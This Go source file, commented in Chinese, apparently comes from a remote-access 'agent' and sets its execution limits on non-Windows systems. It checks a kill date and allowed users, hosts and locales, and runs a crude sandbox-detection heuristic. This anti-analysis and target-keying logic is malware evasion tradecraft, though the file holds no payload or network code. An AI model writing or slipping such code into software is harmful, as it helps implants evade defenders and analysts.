//go:build !windows || !amd64

// Package limits 提供 Agent 执行限制（非 Windows 平台）。
package limits

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"
)

// Check 检查所有执行限制。
func (c *Config) Check() error {
	if !c.KillDate.IsZero() && time.Now().After(c.KillDate) {
		return fmt.Errorf("kill date reached")
	}
	if IsSandbox() {
		return fmt.Errorf("sandbox detected")
	}
	if len(c.AllowedUsers) > 0 {
		currentUser := os.Getenv("USER")
		if !containsStr(c.AllowedUsers, currentUser) {
			return fmt.Errorf("user not allowed: %s", currentUser)
		}
	}
	if len(c.AllowedHosts) > 0 {
		hostname, _ := os.Hostname()
		if !containsStr(c.AllowedHosts, hostname) {
			return fmt.Errorf("host not allowed: %s", hostname)
		}
	}
	if err := c.CheckHardware(); err != nil {
		return err
	}
	if err := c.CheckTimezone(); err != nil {
		return err
	}
	if err := c.CheckLocale(); err != nil {
		return err
	}
	return nil
}

// CheckLocale 检查系统语言。
func (c *Config) CheckLocale() error {
	if len(c.AllowedLocales) == 0 {
		return nil
	}
	locale := os.Getenv("LANG")
	if locale == "" {
		return nil
	}
	if !containsStr(c.AllowedLocales, locale) {
		return fmt.Errorf("locale not allowed: %s", locale)
	}
	return nil
}

// IsSandbox 非 Windows 平台简化检测。
func IsSandbox() bool {
	score := 0
	if runtime.NumCPU() < 2 {
		score += 2
	}
	if os.Getenv("USER") == "sandbox" || os.Getenv("USER") == "test" {
		score += 2
	}
	return score >= 4
}

// GetLocale 获取当前系统语言。
func GetLocale() string {
	return os.Getenv("LANG")
}

// GetTimezone 获取当前时区。
func GetTimezone() string {
	tz, _ := time.Now().Zone()
	return tz
}

func containsStr(slice []string, item string) bool {
	for _, s := range slice {
		if strings.EqualFold(s, item) {
			return true
		}
	}
	return false
}
